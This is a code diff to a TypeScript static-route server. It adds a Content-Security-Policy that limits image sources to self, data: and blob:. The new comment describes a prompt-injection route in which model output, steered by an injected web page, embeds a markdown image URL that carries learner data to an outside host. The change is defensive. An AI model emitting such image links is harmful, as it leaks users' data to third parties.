@@ -30,6 +30,14 @@ export function buildStaticRoutes(
   // no-op on a POSIX path but turned a Windows path like `C:\…\dist` into `/C:\…\dist` — so the
   // packaged Windows app served a 404 for index.html and every asset (the app opened to "404 Not
   // Found"). `root` is already absolute (`resolve(...)`), so no massaging is needed.
+  // Only img-src: model output can carry `![](https://host/?q=<learner data>)` from an injected web
+  // page, and MarkdownImage already holds those back — this stops any render path that misses it.
+  // default-src is left alone; KaTeX fonts, mermaid's inline SVG and Vite's chunks load from self
+  // or inline and were never the risk. data: and blob: carry attachments and LabelDiagram's SVG.
+  app.use('/*', async (c, next) => {
+    await next();
+    if (!c.req.path.startsWith('/api/')) c.header('Content-Security-Policy', "img-src 'self' data: blob:");
+  });
   app.use('/*', serveStatic({ root }));
   app.get('*', async (c, next) => {
     if (c.req.path.startsWith('/api/')) return next();
